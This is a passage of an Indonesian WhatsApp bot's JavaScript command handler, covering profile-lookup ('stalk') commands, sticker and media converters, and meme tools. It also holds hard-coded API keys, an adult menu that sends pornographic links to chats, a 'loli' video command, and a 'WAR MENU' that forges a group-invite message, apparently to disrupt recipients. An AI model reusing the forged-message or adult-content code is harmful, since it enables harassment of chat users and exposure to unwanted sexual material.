└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Username : ${ini_result.name}\`\`\`
\`\`\`• Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`• Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`• Pengikut : ${ini_result.followers}\`\`\`
\`\`\`• Following : ${ini_result.following}\`\`\`
\`\`\`• Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`• Link : ${ini_result.url}\`\`\`
`
             Ramdani.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
      case 'stalkig':
      case 'igstalk':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani.chan26`)
             freply(mess.wait)
             username = args[0]
             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolhumanapi}`)
             ini_result = ini_result.result
             ini_buffer = await getBuffer(ini_result.photo_profile)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Username : ${ini_result.username}\`\`\`
\`\`\`• Nama : ${ini_result.fullname}\`\`\`
\`\`\`• Pengikut : ${ini_result.followers}\`\`\`
\`\`\`• Mengikuti : ${ini_result.following}\`\`\`
\`\`\`• Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`• Link : https://instagram.com/${ini_result.username}\`\`\`
`
             Ramdani.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
      case 'stalktiktok':
      case 'tiktokstalk':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (args.length == 0) return freply(`Example: ${prefix + command} marz.hiatus`)
             freply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${lolhumanapi}`)
             get_result = get_result.result
             pp_tt = await getBuffer(get_result.user_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Username : ${get_result.username}\`\`\`
\`\`\`• Nama : ${get_result.nickname}\`\`\`
\`\`\`• Pengikut : ${get_result.followers}\`\`\`
\`\`\`• Mengikuti : ${get_result.followings}\`\`\`
\`\`\`• Likes : ${get_result.likes}\`\`\`
\`\`\`• Video : ${get_result.video}\`\`\`
\`\`\`• Deskripsi : ${get_result.bio}\`\`\`
`
              Ramdani.sendMessage(from, pp_tt, image, { quoted: mek, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break
       case 'iguser':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              try {
              if (args.length == 0) return freply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
              query = args.join(" ")
              freply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${zeksapi}&q=${query}`)
              get_result = get_result.result
              teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
              for(let i = 0; i < get_result.length; i++) {
              teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
}
              ini_buffer = await getBuffer(get_result[0].profile_pic)
              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              freply(`Maaf username ${query} tidak ditemukan`)
}
              break
        
case 'ffstalk':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
if (args.length == 0) return freply(`Idnya mana kak?`)
                    ff_id = args[0]
                    get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/freefire/${ff_id}?apikey=genbotkey`)
                    freply(`nih kak`)
                    break      
//------------------< media/sticker/Tools >-------------------

       case 'dadu':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              dadu()
             .then(async (body) => {
              dadugerak = body.split('\n')
              dadugerakx = dadugerak[Math.floor(Math.random() * dadugerak.length)]
              sendWebp(from, dadugerakx)
})
             .catch(async (err) => {
              console.error(err)
              freply('Error!')
})
              break              
      case 'doge':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'patrick':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'gura':
       case 'gawrgura':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'animestick':
       case 'stickeranime':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
             .then(res => res.text())
             .then(body => {
              let todd = body.split("\n");
              let pjrr = todd[Math.floor(Math.random() * todd.length)];
              sendWebp(from, pjrr)
}
)
              break
       case 'telesticker': 
       case 'telestiker':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!q) return freply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
              freply(mess.wait)
              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolhumanapi}&url=${args[0]}`)
              ini_sticker = ini_url.result.sticker
              freply('Sending '+ ini_sticker.length +' stickers...')
              for (sticker_ in ini_sticker) {
              ini_buffer = await getBuffer(ini_sticker[sticker_])
              Ramdani.sendMessage(from, ini_buffer, sticker, {})
}
              break
       case 'semoji':
       case 'emoji':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} ðŸ˜­`)
              emoji = args[0]
              try {
              emoji = encodeURI(emoji[0])
              } catch {
              emoji = encodeURI(emoji)
 }
              ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolhumanapi}`)
              await Ramdani.sendMessage(from, ini_buffer, sticker, { quoted: mek })
              break
case 'ttp2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
freply('wait....')
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break
case 'ttp':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani Official`)
              woy = args.join(" ")
              freply(mess.wait)
              buffer = await getBuffer(`http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`)
              Ramdani.sendMessage(from, buffer, sticker, { quoted: mek })
              break
       case 'attp':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani Official`)
              freply(mess.wait)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              Ramdani.sendMessage(from, buffer, sticker, { quoted: mek })
              break
       case 'ttg':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!q) return await freply(mess.wrongFormat)
              freply(mess.wait)
              sendWebp(from, `https://api.vhtear.com/textxgif?text=${q}&apikey=${vhtearapi}`)
             .then(() => console.log('Success creating GIF!'))
             .catch(async (err) => {
              console.error(err)
              freply('Error!')
})
              break
       case 'loliv':
       case 'lolivid':
       case 'lolivideo':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              freply(`${err}`)
})
              break
       case 'gifstiker':
				case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
		      if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                freply('error')
                })
                .on('end', function () {
                console.log('Finish')
                Ramdani.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            freply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            freply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            Ramdani.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                freply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break    
       case 'take':
       case 'colong':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isQuotedSticker) return freply('Stiker aja om')
              encmedia = JSON.parse(JSON.strngify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              satu = anu[0] !== '' ? anu[0] : `${pushname}`
              dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
              require('./lib/fetch.js').createExif(satu, dua)
              require('./lib/fetch.js').modStick(media, Ramdani, mek, from)
              break
       case 'delwm':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isQuotedSticker) return freply('Stiker aja om')
              encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              satu = anu[0] !== '' ? anu[0] : ``
              dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
              require('./lib/fetch.js').createExif(satu, dua)
              require('./lib/fetch.js').modStick(media, Ramdani, mek, from)
              break
       case 'stikerwm':
       case 'stickerwm':
       case 'swm':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              var a = arg.split("|")[0];
              var b = arg.split("|")[1];
              if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
              const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              Ramdani.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              Ramdani.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out) 
              } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
              const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              const media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
              pe = args.join('')
              var a = pe.split("|")[0];
              var b = pe.split("|")[1];
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              Ramdani.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              Ramdani.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out)       
              } else {
              freply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
}
              break
      case 'toimg':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isQuotedSticker) return freply('reply stickernya')
              freply(mess.wait)
              encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
              ran = getRandom('.png')
              exec(`ffmpeg -i ${media} ${ran}`, (err) => {
              fs.unlinkSync(media)
              if (err) return freply('Gagal, pada saat mengkonversi sticker ke gambar')
              buffer = fs.readFileSync(ran)
              Ramdani.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih'})
              fs.unlinkSync(ran)
})
              break
              case 'smeme': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
freply('Loading.... ')
top = arg.split('|')[0]
bottom = arg.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
owgi = await  Ramdani.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerUrl(from, `${anu1}`)
} else {
freply('Gunakan foto/stiker!')
}
break

       case 'memeimg':
       case 'memegen':                    
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              freply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await Ramdani.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendMediaURL(from, `${anu1}`, mess.success)
              } else {
              freply('Gunakan foto/stiker!')
}
               break
        case 'togif':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               freply(mess.wait)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await Ramdani.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               Ramdani.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               freply(mess.wrongFormat)
}
               break
        case 'tovideo':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               freply(mess.wait)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await Ramdani.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               Ramdani.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               freply(mess.wrongFormat)
}
               break
        case 'tomp3':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if (isQuotedVideo || isQuotedAudio){
               freply(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
               media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
               ran = getRandom('.mp3')
               exec(`ffmpeg -i ${media} ${ran}`, (err) => {
               fs.unlinkSync(media)
               if (err) return freply(`Err: ${err}`)
               buffer453 = fs.readFileSync(ran)
               Ramdani.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
               fs.unlinkSync(ran)
})
               } else {
               freply(mess.wrongFormat)
}
               break      
//------------------<18+ Menu>-----------------------   
       case 'randombokep':
              if (!isRegist) return freply(mess.regist)
              if (isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
              if (!isPremium) return freply(mess.premium)
              bokep = body.slice(1)
              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
              const kep = bo[Math.floor(Math.random() * bo.length)]
              Ramdani.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: ftoko, caption: `NI BOKEP SAYA DAPAT DARI *© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ* DOSA TANGGUNG SENDIRI🗿`})
              break
                case 'xnxx':
              if (!isRegist) return freply(mess.regist)
              if (isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
              if (!isPremium) return freply(mess.premium)
                    if (args.length == 0) return freply(`Contoh: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
case 'xnxxsearch':
              if (!isRegist) return freply(mess.regist)
              if (isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
              if (!isPremum) return freply(mess.premium)
              if (args.length == 0) return freply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=genbotkey&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    freply(ini_txt)
                    break
case 'bokep':
case '4everproxy':
case 'vpn':
if (!isRegist) return freply(mess.regist)
if (!isDewasa) return freply(mess.dewasa)
if (isBanned) return freply(mess.banned)
if (!isPremium) return freply(mess.premium)
freply(`*TOBAT TOLOL, BOKEP MULU PIKIRAN LU,*`)
break
//KODE MENU
case 'kodebahasa':                  
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`id = Indonesia
en = English
jp = Japan`)
break 
                    case 'kodenegara':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
                    negara = args.join(' ')
                    texxt = args.join(' ')
					Ramdani.sendMessage(from, negara(), texxt)
					break
                    case 'tts':
                    if (!isRegist) return freply(mess.regist)
                    if (isBanned) return freply(mess.banned)
				    if (args.length < 1) return Ramdani.sendMessage(from, 'Diperlukan kode bahasa kak!!', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return Ramdani.sendMessage(from, 'Mana teks yang mau di jadiin suara? suara setan kah?', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 500
					? freply('Textnya kebanyakan cok')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buffer = fs.readFileSync(rano)
							if (err) return freply(ind.stikga())
							Ramdani.sendMessage(from, buffer, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					break
//------------------<WAR MENU>---------------    
 case 'pvp':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (!mek.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./media/audio/numayei.mp3')
Ramdani.sendMessage(from, tapib1, document, { quoted: mek, filename:`Ramdani Official ~ 404 ${danz}.mp3`, mimetype: 'audio/application' })
await freply('Bang mau nanya')
break  
case 'pgp':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (!isOwner && !mek.key.fromMe) return
buf = Mfake
imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Ramdani.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6289512545999-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": "162533333338378",
"groupName": `Ramdani Official ~ 404 ${danz}`,
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW9uZJZX5mY+8fL0FAMzSrzHZew8zTOeeTkHfrRC9cge6o2Hma0RLBnHgnI3bqSa9Zg6hvP8DTsqc5OaGaN4ySoyMbigR2p5zg9fhSpRlSRzDHkR2pUAbja6feXn/p7d3H2sYH31MWPCMjnmv5gi/Yj3J+dSeizE6Va8pP1Ox9aPEzg9Wx8aYDen6LZWJDW8Kh/ttu330f4R8wRQouZB32+FOLdsBvj7qACPC9KXhfGmRdnuAa6W7X+paAH1Q46mveU+eflTK3MQ7EV2LmL7X4UAdlT6V4QfgO9ITRnfnWm5powvVT6ZoAi9f1a30mykmuSPcGeUnrXz5xTrc2uak9xJ7sIOEUDAx51O+0nX3vtVkgjcmFTjlB+sao7BnPvH4AVDdlIRYV3CeY9T8hXBXk6iukYnz+QoAKB7An503IT0DN8qUSNIcDp38qe8JYyMjLedACs7cvKC+Wx1zUxbar4RZYlCAbAiouWTkh8NRjO5PemOmw60uN7HdBV1OZZPFY7t1qOurqTkMLNzRE5A8jT4PulT8ai7r3Xxn3e1UlRJ2jcmWHU7UQhPKB5fnQUR5mHkKKVsKp9c0xDwIU79t6ctLZ7p8BSR2puOJpZuRerd607hLQI4bdXkQcx6ZqJzo0hCzOb3SZ7dS3IcDcjFKtf1TTI5oWygzjcUqj5WtlvF+AWHV7y2iWOCbCL0XAOKdHE+ooPrxsB5rUJNMkf1iPhUdc3buuF90YrVswNBfXL6GLneGKRfJVOTRB12VE5ns89Nlk9fhTcHgx6XbXE3NytEhJAz1A7Cibm3UQnAyNvzp9jHE1uJvrW0y/ca6XWLXqRKvxWmvogKjpXJtNsBRTphaDF1a0b/OI+KmnBqFq3S4j+ZxUabId0rg2IH9B+6jsOibWeJx7ksbD0Iqk8ccVwadA0MDCS6cEbdFrriRY7HTXmchFGxJ2rHdQu/pN08h2ycKPIfCpbY0jyWRpJGkcks3UmuUB/pBLdgBRFrZSzMvOCinz61N2dtEHEVvGJGHYdPmazlOjSMGyHj01zF40+AD0XuakLDQ5px4jIVQ+lW3TND5mWa7xJL2GPdUegovW5Bb2awwLhmPIoHc96z+Rs0+NIo9xEiO